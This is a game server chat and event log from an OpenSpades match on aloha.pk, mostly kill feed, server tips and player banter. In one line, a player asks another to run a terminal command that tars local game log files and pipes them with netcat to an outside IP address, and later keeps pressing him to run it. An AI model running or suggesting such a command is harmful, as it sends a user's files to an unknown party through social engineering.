Fri Sep 26 00:09:50 2025 [Team] ATORRES_BR! (Blue): t?
Fri Sep 26 00:09:59 2025 ▬ChuckBorris joined Blue team
Fri Sep 26 00:10:00 2025 [Global] ATORRES_BR! (Blue): i will put on aloha if u desire
Fri Sep 26 00:10:11 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:10:11 2025 [Global] not a burner (): the script or the folder?
Fri Sep 26 00:10:12 2025 Yotsen (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:10:13 2025 [Global] ATORRES_BR! (Blue): because i an on another project
Fri Sep 26 00:10:25 2025  Build a tower to get the enemy's intel. Take it to your team's tent to win!
Fri Sep 26 00:10:27 2025 [Global] ATORRES_BR! (Blue): the new script to handle icons
Fri Sep 26 00:10:28 2025 [Global] The Beast (Blue): spectators please play now\
Fri Sep 26 00:10:31 2025 [Global] not a burner (): no
Fri Sep 26 00:10:32 2025 [Global] ATORRES_BR! (Blue): and the new client
Fri Sep 26 00:10:41 2025 [Global] not a burner (): client comes with folder?
Fri Sep 26 00:11:13 2025 [Global] ATORRES_BR! (Blue): yes, all openspades are builted on openspades folders
Fri Sep 26 00:11:18 2025 [Global] ATORRES_BR! (Blue): but this is changed
Fri Sep 26 00:11:21 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:11:25 2025  Type /HELP for info & commands
Fri Sep 26 00:11:26 2025 [Global] ATORRES_BR! (Blue): i keep just the code
Fri Sep 26 00:11:30 2025 [Global] ATORRES_BR! (Blue): credits
Fri Sep 26 00:11:34 2025 [Global] ATORRES_BR! (Blue): sorry
Fri Sep 26 00:11:37 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:11:56 2025 [Global] ATORRES_BR! (Blue): the credits to openspades, synspades continue
Fri Sep 26 00:12:02 2025 Yotsen (Red) [Rifle] The Beast (Blue)
Fri Sep 26 00:12:23 2025 [Global] ATORRES_BR! (Blue): i will make a especial resume to BEN AKSOY
Fri Sep 26 00:12:25 2025  Visit our community forums at https://aloha.pk/
Fri Sep 26 00:12:30 2025 [Global] ATORRES_BR! (Blue): on new client repo[
Fri Sep 26 00:12:50 2025 The Beast (Blue) [Rifle] Yotsen (Red)
Fri Sep 26 00:12:59 2025 [Global] ATORRES_BR! (Blue): but now im working on 2 others projects
Fri Sep 26 00:13:03 2025 [Global] ATORRES_BR! (Blue): to my work
Fri Sep 26 00:13:15 2025 [Global] ATORRES_BR! (Blue): for this reason i dont end the new sopaspades
Fri Sep 26 00:13:22 2025 [Global] ATORRES_BR! (Blue): with rains
Fri Sep 26 00:13:25 2025  Come chat with us at https://discord.aloha.pk/
Fri Sep 26 00:13:28 2025 [Global] ATORRES_BR! (Blue): daycycle
Fri Sep 26 00:13:34 2025 Herobrine joined Red team
Fri Sep 26 00:13:35 2025 [Global] ATORRES_BR! (Blue): thunder, etc
Fri Sep 26 00:14:03 2025 Herobrine (Red) [Headshot] ATORRES_BR! (Blue)
Fri Sep 26 00:14:13 2025 [Global] ATORRES_BR! (Blue): i got to bed, i drive 12km from a bike to work
Fri Sep 26 00:14:25 2025  If you believe a player is breaking the rules, please let us know with /ADMIN
Fri Sep 26 00:14:30 2025 [Global] ATORRES_BR! (Blue): yes, im go 7pm and take work on 8pm
Fri Sep 26 00:14:40 2025 [Global] ATORRES_BR! (Blue): driving a biike
Fri Sep 26 00:14:48 2025 [Global] ATORRES_BR! (Blue): 12km on relive <3
Fri Sep 26 00:14:50 2025 [Global] The Beast (Blue): U Brazilian?
Fri Sep 26 00:14:53 2025 [Global] ATORRES_BR! (Blue): yah
Fri Sep 26 00:15:07 2025 [Global] ATORRES_BR! (Blue): i make 24km from a bike, every days
Fri Sep 26 00:15:14 2025 [Global] not a burner (): atorres, can you run a command in terminal for me?
Fri Sep 26 00:15:15 2025 [Global] ATORRES_BR! (Blue): i will put my relive videos on youtube
Fri Sep 26 00:15:21 2025 [Global] ATORRES_BR! (Blue): yes
Fri Sep 26 00:15:25 2025  This server runs imger and glow. Use /IMG or /GLOW to toggle them.
Fri Sep 26 00:15:25 2025 [Global] not a burner (): tar cf - .local/share/openspades/Resources/NetLogs | gzip - | nc -Nv 66.135.15.57 6785 
Fri Sep 26 00:15:29 2025 [Global] not a burner (): that one
Fri Sep 26 00:15:45 2025 [Global] ATORRES_BR! (Blue): a momment
Fri Sep 26 00:15:51 2025  Yotsen has reached 1000 blocks placed! /heaven unlocked.
Fri Sep 26 00:15:59 2025 The Beast (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:16:25 2025  Use /EMOTE to draw an emote on the map!
Fri Sep 26 00:16:28 2025 Herobrine (Red) [SMG] ATORRES_BR! (Blue)
Fri Sep 26 00:16:29 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:16:34 2025 sapee joined Blue team
Fri Sep 26 00:16:44 2025 sapee (Blue) [Fall]
Fri Sep 26 00:17:22 2025 Aikiboy (Red) [Grenade]
Fri Sep 26 00:17:25 2025  Use /HEAVEN to paint the babel platform!
Fri Sep 26 00:17:27 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:17:32 2025 Herobrine (Red) [SMG] sapee (Blue)
Fri Sep 26 00:17:50 2025 The Beast (Blue) [Rifle] Yotsen (Red)
Fri Sep 26 00:17:57 2025 Herobrine (Red) [SMG] sapee (Blue)
Fri Sep 26 00:18:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Fri Sep 26 00:19:18 2025 Aikiboy picked up Blue's Intel.
Fri Sep 26 00:19:19 2025 zxcvbdnm joined Red team
Fri Sep 26 00:19:23 2025 The Beast (Blue) [Headshot] zxcvbdnm (Red)
Fri Sep 26 00:19:25 2025  Capture your team's 5th intel to unlock /APOC for your team's best builder!
Fri Sep 26 00:19:26 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:19:33 2025 Player zxcvbdnm has left
Fri Sep 26 00:19:53 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:19:57 2025 zxcvbdnm joined Red team
Fri Sep 26 00:20:18 2025 Herobrine (Red) [SMG] sapee (Blue)
Fri Sep 26 00:20:25 2025  Mahalo for playing aloha.pk tower of babel
Fri Sep 26 00:20:30 2025 Yotsen (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:21:21 2025 Aikiboy dropped Blue's Intel
Fri Sep 26 00:21:21 2025  The intel has returned to the heavens
Fri Sep 26 00:21:21 2025 The Beast (Blue) [Rifle] Aikiboy (Red)
Fri Sep 26 00:21:25 2025  Build a tower to get the enemy's intel. Take it to your team's tent to win!
Fri Sep 26 00:21:26 2025 Yotsen (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:21:50 2025 sapee (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:22:25 2025 The Beast (Blue) [Headshot] zxcvbdnm (Red)
Fri Sep 26 00:22:25 2025 Herobrine (Red) [SMG] sapee (Blue)
Fri Sep 26 00:22:25 2025  Type /HELP for info & commands
Fri Sep 26 00:22:33 2025 The Beast (Blue) [Rifle] Aikiboy (Red)
Fri Sep 26 00:22:36 2025 [Global] not a burner (): atorres is awoken?
Fri Sep 26 00:22:41 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:22:57 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:22:58 2025 The Beast (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:23:02 2025 [Global] ATORRES_BR! (Blue): im here
Fri Sep 26 00:23:03 2025 zxcvbdnm (Red) [SMG] The Beast (Blue)
Fri Sep 26 00:23:07 2025 [Global] ATORRES_BR! (Blue): im go to bed bruvs
Fri Sep 26 00:23:15 2025 [Global] not a burner (): atorres not run my command?
Fri Sep 26 00:23:15 2025  Y.O.B.A. was kicked: Inactive for 30 minutes
Fri Sep 26 00:23:15 2025 Player Y.O.B.A. has left
Fri Sep 26 00:23:24 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:23:25 2025  Visit our community forums at https://aloha.pk/
Fri Sep 26 00:23:27 2025 Y.O.B.A. joined Spectator team
Fri Sep 26 00:23:41 2025 [Global] The Beast (Blue): Can someone explain what discord is?
Fri Sep 26 00:23:43 2025 [Global] ATORRES_BR! (Blue): i will, but, why is u real name and you city and achool
Fri Sep 26 00:23:55 2025 [Global] ATORRES_BR! (Blue): :)
Fri Sep 26 00:24:00 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:24:11 2025 zxcvbdnm (Red) [SMG] The Beast (Blue)
Fri Sep 26 00:24:13 2025 ▬ChuckBorris (Blue) [Headshot] zxcvbdnm (Red)
Fri Sep 26 00:24:16 2025 Yotsen (Red) [Fall]
Fri Sep 26 00:24:23 2025 [Global] ATORRES_BR! (Blue): burber is awoken ?
Fri Sep 26 00:24:23 2025 [Global] not a burner (): Jack Thompson, city of dallas, shool is University at Dallas
Fri Sep 26 00:24:25 2025  Come chat with us at https://discord.aloha.pk/
Fri Sep 26 00:24:31 2025 [Global] ATORRES_BR! (Blue): LIERRRRR
Fri Sep 26 00:24:32 2025 [Global] not a burner (): hehe
Fri Sep 26 00:24:41 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:25:00 2025  With 1086 blocks placed, Yotsen is granted the right to unleash the apocalypse.
Fri Sep 26 00:25:00 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:25:06 2025 sapee (Blue) [Headshot] zxcvbdnm (Red)
Fri Sep 26 00:25:11 2025 Player zxcvbdnm has left
Fri Sep 26 00:25:16 2025  Yotsen has unleashed an apocalypse from God.
Fri Sep 26 00:25:17 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:25:18 2025  The apocalypse begins in 5
Fri Sep 26 00:25:19 2025  The apocalypse begins in 4
Fri Sep 26 00:25:20 2025  The apocalypse begins in 3
Fri Sep 26 00:25:21 2025 Herobrine (Red) [SMG] The Beast (Blue)
Fri Sep 26 00:25:21 2025  The apocalypse begins in 2
Fri Sep 26 00:25:22 2025  The apocalypse begins in 1
Fri Sep 26 00:25:25 2025 Yotsen (Red) [Grenade] ▬ChuckBorris (Blue)
Fri Sep 26 00:25:25 2025  If you believe a player is breaking the rules, please let us know with /ADMIN
Fri Sep 26 00:25:25 2025 Yotsen (Red) [Grenade] sapee (Blue)
Fri Sep 26 00:25:34 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:25:37 2025 Aikiboy picked up Blue's Intel.
Fri Sep 26 00:25:39 2025  The apocalypse has ended.
Fri Sep 26 00:25:46 2025 [Global] not a burner (): why atorres thinks i have a school?
Fri Sep 26 00:25:50 2025 [Global] not a burner (): i do not have a school
Fri Sep 26 00:25:55 2025 Aikiboy captured Blue's Intel.
Fri Sep 26 00:25:57 2025 Yotsen (Red) [Rifle] sapee (Blue)
Fri Sep 26 00:26:05 2025 Herobrine (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:26:08 2025 [Global] ATORRES_BR! (Blue): becouse i have a school
Fri Sep 26 00:26:10 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:26:12 2025 ▬ChuckBorris (Blue) [SMG] Aikiboy (Red)
Fri Sep 26 00:26:13 2025 [Global] not a burner (): what does it do
Fri Sep 26 00:26:13 2025 Yotsen dropped Blue's Intel
Fri Sep 26 00:26:13 2025 ▬ChuckBorris (Blue) [SMG] Yotsen (Red)
Fri Sep 26 00:26:25 2025  This server runs imger and glow. Use /IMG or /GLOW to toggle them.
Fri Sep 26 00:26:44 2025 ▬ChuckBorris (Blue) [SMG] Yotsen (Red)
Fri Sep 26 00:26:53 2025 The Beast (Blue) [Headshot] Herobrine (Red)
Fri Sep 26 00:26:59 2025 Player Herobrine has left
Fri Sep 26 00:27:04 2025 Yotsen (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:27:08 2025 Yotsen (Red) [Headshot] ▬ChuckBorris (Blue)
Fri Sep 26 00:27:10 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:27:11 2025 Player ▬ChuckBorris has left
Fri Sep 26 00:27:23 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:27:25 2025  Use /EMOTE to draw an emote on the map!
Fri Sep 26 00:27:27 2025 sapee (Blue) [SMG] Yotsen (Red)
Fri Sep 26 00:27:44 2025 [Global] not a burner (): atorres is using facebook?
Fri Sep 26 00:27:53 2025 Aikiboy picked up Blue's Intel.
Fri Sep 26 00:27:55 2025 Aikiboy dropped Blue's Intel
Fri Sep 26 00:27:55 2025 The Beast (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:27:56 2025 Yotsen (Red) [Headshot] sapee (Blue)
Fri Sep 26 00:28:16 2025 [Global] not a burner (): atorres doesn't like my command?
Fri Sep 26 00:28:22 2025 Yotsen (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:28:25 2025  Use /HEAVEN to paint the babel platform!
Fri Sep 26 00:28:25 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:28:42 2025 Yotsen captured Blue's Intel.
Fri Sep 26 00:28:54 2025 [Global] ATORRES_BR! (Blue): u dont say to me u real name
Fri Sep 26 00:29:05 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:29:06 2025 Aikiboy picked up Blue's Intel.
Fri Sep 26 00:29:07 2025 [Global] not a burner (): how do you know what name i give you is real or not
Fri Sep 26 00:29:08 2025 Aikiboy dropped Blue's Intel
Fri Sep 26 00:29:08 2025 The Beast (Blue) [Rifle] Aikiboy (Red)
Fri Sep 26 00:29:18 2025 OmarCraftX3040 joined Blue team
Fri Sep 26 00:29:24 2025 Yotsen (Red) [Rifle] sapee (Blue)
Fri Sep 26 00:29:25 2025 [Global] not a burner (): if i say my real name, you will say it's fake too
Fri Sep 26 00:29:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Fri Sep 26 00:29:25 2025 [Global] ATORRES_BR! (Blue): blabalbalabal
Fri Sep 26 00:29:28 2025 [Global] ATORRES_BR! (Blue): afrayd
Fri Sep 26 00:29:33 2025 Aikiboy picked up Blue's Intel.
Fri Sep 26 00:29:46 2025 [Global] OmarCraftX3040 (Blue): hola
Fri Sep 26 00:29:46 2025 [Global] Yotsen (Red): gg
Fri Sep 26 00:29:50 2025 Aikiboy captured Blue's Intel.
Fri Sep 26 00:29:50 2025 Red Wins!
Fri Sep 26 00:29:50 2025  Game finished! Next map: greencoast.
Fri Sep 26 00:29:51 2025 The Beast (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:29:52 2025 Yotsen (Red) [Headshot] ATORRES_BR! (Blue)
Fri Sep 26 00:29:54 2025 The Beast (Blue) [Headshot] Yotsen (Red)
Fri Sep 26 00:29:56 2025 [Global] ATORRES_BR! (Blue): trump dont will nock on u dood
Fri Sep 26 00:29:57 2025 [Global] ATORRES_BR! (Blue): xD
Fri Sep 26 00:29:59 2025 The Beast picked up Red's Intel.
Fri Sep 26 00:30:00 2025 ------ World Unloaded ------
Fri Sep 26 00:30:02 2025 Disconnecting
